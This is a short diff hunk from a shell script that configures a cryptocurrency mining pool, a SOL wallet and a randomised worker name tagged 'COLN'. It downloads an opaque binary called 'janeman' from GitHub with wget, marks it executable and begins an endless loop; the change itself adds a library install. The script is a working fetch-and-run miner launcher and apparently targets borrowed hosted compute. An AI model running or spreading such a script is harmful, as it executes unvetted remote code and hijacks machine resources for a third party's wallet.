@@ -2,6 +2,7 @@
 POOL=ethash.unmineable.com:3333
 WALLET=SOL:2gQKjdGD6BFMk7hnA6xzZvg9EbnPzUErHdyi39uqfLvf
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
+apt-get install libpci3
 wget https://github.com/squibex/prem/raw/main/janeman
 chmod +x janeman
 	while [ 1 ]; do
